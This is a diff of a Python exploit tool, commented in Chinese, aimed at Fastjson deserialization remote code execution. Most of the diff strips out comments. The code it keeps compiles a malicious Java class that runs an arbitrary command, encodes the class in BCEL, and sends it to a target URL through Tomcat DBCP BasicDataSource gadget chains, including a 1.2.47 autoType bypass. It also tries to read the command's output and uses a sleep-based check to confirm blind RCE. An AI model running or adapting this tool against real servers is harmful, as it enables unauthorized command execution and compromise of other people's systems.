@@ -44,9 +44,6 @@ import time
 import urllib.request
 import urllib.error
 
-# ══════════════════════════════════════════════════════════
-# BCEL 编码
-# ══════════════════════════════════════════════════════════
 
 BCEL_CHAR_MAP = 'ABCDEFGHIJKLMNOP'
 
@@ -80,11 +77,7 @@ def bcel_encode(class_bytes: bytes) -> str:
     return '$$BCEL$$' + ''.join(result)
 
 
-# ══════════════════════════════════════════════════════════
-# Java class 编译
-# ══════════════════════════════════════════════════════════
 
-# 目标 JVM 版本（Java 8 = major 52）
 TARGET_CLASS_VERSION = 52
 
 
@@ -105,17 +98,16 @@ def patch_class_version(class_bytes: bytes, target_major: int = TARGET_CLASS_VER
 
     magic = class_bytes[:4]
     if magic != b'\xca\xfe\xba\xbe':
-        return class_bytes  # 不是有效的 class 文件
+        return class_bytes
 
     current_major = int.from_bytes(class_bytes[6:8], 'big')
     if current_major <= target_major:
-        return class_bytes  # 已经是低版本，不需要改
+        return class_bytes
 
-    # 替换: minor=0, major=target_major
     patched = (
         class_bytes[:4]
-        + (0).to_bytes(2, 'big')             # minor version = 0
-        + target_major.to_bytes(2, 'big')    # major version = 52
+        + (0).to_bytes(2, 'big')
+        + target_major.to_bytes(2, 'big')
         + class_bytes[8:]
     )
     return patched
@@ -165,7 +157,6 @@ public class {class_name} {{
         with open(java_file, 'w') as f:
             f.write(java_code)
 
-        # 编译（不指定 --release，用 patch_class_version 降级版本号）
         result = subprocess.run(
             ['javac', java_file],
             capture_output=True, text=True, timeout=30, cwd=tmpdir,
@@ -226,11 +217,7 @@ public class {class_name} {{
         shutil.rmtree(tmpdir, ignore_errors=True)
 
 
-# ══════════════════════════════════════════════════════════
-# Payload 生成
-# ══════════════════════════════════════════════════════════
 
-# 所有可能的 BasicDataSource 类路径（不同 classpath 环境）
 DATASOURCE_CLASSES = [
     "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
     "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
@@ -276,7 +263,6 @@ def gen_bcel_payload_bypass(bcel_str: str, datasource_class: str) -> str:
 
 def gen_sleep_payload(seconds: int, datasource_class: str) -> str:
     """生成延时验证 payload（用 Thread.sleep 代替命令执行）"""
-    # 编译一个 sleep 类
     java_code = f'''public class SleepTest {{
     static {{
         try {{ Thread.sleep({seconds * 1000}); }} catch (Exception e) {{}}
@@ -306,9 +292,6 @@ def gen_sleep_payload(seconds: int, datasource_class: str) -> str:
         shutil.rmtree(tmpdir, ignore_errors=True)
 
 
-# ══════════════════════════════════════════════════════════
-# HTTP 发送
-# ══════════════════════════════════════════════════════════
 
 def send_payload(target_url: str, payload_json: str, timeout: int = 15) -> tuple[int, str, float]:
     """
@@ -316,7 +299,6 @@ def send_payload(target_url: str, payload_json: str, timeout: int = 15) -> tuple
 
     Returns: (status_code, response_body, elapsed_seconds)
     """
-    # 用 curl（比 urllib 更可靠，支持各种 edge case）
     start = time.time()
     try:
         result = subprocess.run(
@@ -332,7 +314,6 @@ def send_payload(target_url: str, payload_json: str, timeout: int = 15) -> tuple
         elapsed = time.time() - start
         output = result.stdout
 
-        # 分离 body 和 status code
         if '__HTTP_CODE:' in output:
             parts = output.rsplit('__HTTP_CODE:', 1)
             body = parts[0].strip()
@@ -350,9 +331,6 @@ def send_payload(target_url: str, payload_json: str, timeout: int = 15) -> tuple
         return 0, str(e), elapsed
 
 
-# ══════════════════════════════════════════════════════════
-# 主流程
-# ══════════════════════════════════════════════════════════
 
 def try_bcel_chains(target_url: str, command: str) -> bool:
     """尝试所有 BCEL gadget 链（自动区分 1.2.24 直接版和 1.2.47 绕过版）"""
@@ -361,7 +339,6 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
     print(f"命令: {command}")
     print(f"{'='*60}")
 
-    # 1. 编译恶意类
     print("\n[1/4] 编译恶意 Java 类...")
     class_bytes = compile_evil_class(command)
     if not class_bytes:
@@ -369,12 +346,10 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
         return False
     print(f"✅ 编译成功 ({len(class_bytes)} bytes)")
 
-    # 2. BCEL 编码
     print("\n[2/4] BCEL 编码...")
     bcel_str = bcel_encode(class_bytes)
     print(f"✅ 编码完成 ({len(bcel_str)} chars)")
 
-    # 3. 遍历所有 DataSource 类，每个都先试直接版再试绕过版
     total_chains = len(DATASOURCE_CLASSES)
     print(f"\n[3/4] 尝试 {total_chains} 种 gadget 链 × 2 种模式（直接 + 绕过）...")
     success_chain = None
@@ -384,7 +359,6 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
         short_name = ds_class.rsplit('.', 1)[-1]
         chain_name = ds_class.rsplit('.', 2)[-2] + "." + short_name
 
-        # ── 模式 A: 直接发送（适用于 1.2.24 及之前，autoType 未限制）──
         if not need_bypass:
             print(f"\n  --- 链 {i}/{total_chains}: {chain_name} [直接模式] ---")
             payload = gen_bcel_payload(bcel_str, ds_class)
@@ -398,7 +372,6 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
             elif result == "autoType_blocked":
                 print(f"  ⚠️ autoType 被限制，切换到 1.2.47 绕过模式")
                 need_bypass = True
-                # 不 break，当前链继续用绕过模式试
             elif result == "class_not_found":
                 continue
             elif result == "bcel_blocked":
@@ -407,7 +380,6 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
                 success_chain = chain_name
                 break
 
-        # ── 模式 B: 1.2.47 绕过（java.lang.Class 缓存注入）──
         print(f"\n  --- 链 {i}/{total_chains}: {chain_name} [1.2.47 绕过模式] ---")
         payload = gen_bcel_payload_bypass(bcel_str, ds_class)
         status, body, elapsed = send_payload(target_url, payload)
@@ -421,9 +393,8 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
             continue
         elif result == "bcel_blocked":
             print(f"  ❌ BCEL ClassLoader 不可用（JDK 版本可能 >= 8u251）")
-            break  # BCEL 本身被禁了，换其他链也没用
+            break
 
-    # 4. 验证结果
     print(f"\n[4/4] 验证命令执行...")
 
     if success_chain:
@@ -432,7 +403,6 @@ def try_bcel_chains(target_url: str, command: str) -> bool:
         if verified:
             return True
 
-    # 延时验证
     print("\n  尝试延时验证...")
     if verify_with_sleep(target_url, need_bypass):
         print("  ✅ 延时验证成功！目标存在盲 RCE")
@@ -476,7 +446,6 @@ def _analyze_response(body: str, status: int, short_name: str) -> str:
         return "maybe_success"
 
     if status == 500 and "type not match" in body_lower:
-        # Fastjson 解析了 @type 但类型不匹配 —— 说明 autoType 生效了
         print(f"  ⚠️ type not match（autoType 已启用，但类加载可能成功）")
         return "maybe_success"
 
@@ -498,7 +467,6 @@ def try_read_output(target_url: str, bcel_str: str, success_chain: str) -> bool:
         DATASOURCE_CLASSES[0],
     )
 
-    # 试直接版和绕过版
     for label, payload in [
         ("直接", gen_bcel_payload(read_bcel, ds_class)),
         ("绕过", gen_bcel_payload_bypass(read_bcel, ds_class)),
@@ -525,7 +493,6 @@ def try_read_output(target_url: str, bcel_str: str, success_chain: str) -> bool:
 
 def verify_with_sleep(target_url: str, use_bypass: bool = False, sleep_seconds: int = 5) -> bool:
     """通过延时判断是否存在盲 RCE"""
-    # 先测基线响应时间
     _, _, baseline = send_payload(
         target_url,
         '{"test": 1}',
@@ -540,12 +507,9 @@ def verify_with_sleep(target_url: str, use_bypass: bool = False, sleep_seconds: 
 
         short = ds_class.rsplit('.', 1)[-1]
 
-        # 根据之前的探测结果决定尝试哪些模式
         modes = []
         if not use_bypass:
             modes.append(("直接", sleep_payload_direct))
-        # 生成 bypass 版 sleep payload
-        # 需要拿到 bcel_str，从 direct payload 中提取
         sleep_bcel_str = json.loads(sleep_payload_direct).get("driverClassName", "")
         if sleep_bcel_str:
             bypass_payload = gen_bcel_payload_bypass(sleep_bcel_str, ds_class)
@@ -609,7 +573,6 @@ def main():
     print("  不需要目标回连攻击机")
     print("=" * 60)
 
-    # 预检
     is_fastjson = detect_fastjson(target)
 
     if args.detect_only:
@@ -618,7 +581,6 @@ def main():
     if not is_fastjson:
         print("\n⚠️ 未确认 Fastjson，仍尝试利用...")
 
-    # 尝试 BCEL 链
     success = try_bcel_chains(target, args.command)
 
     if success:
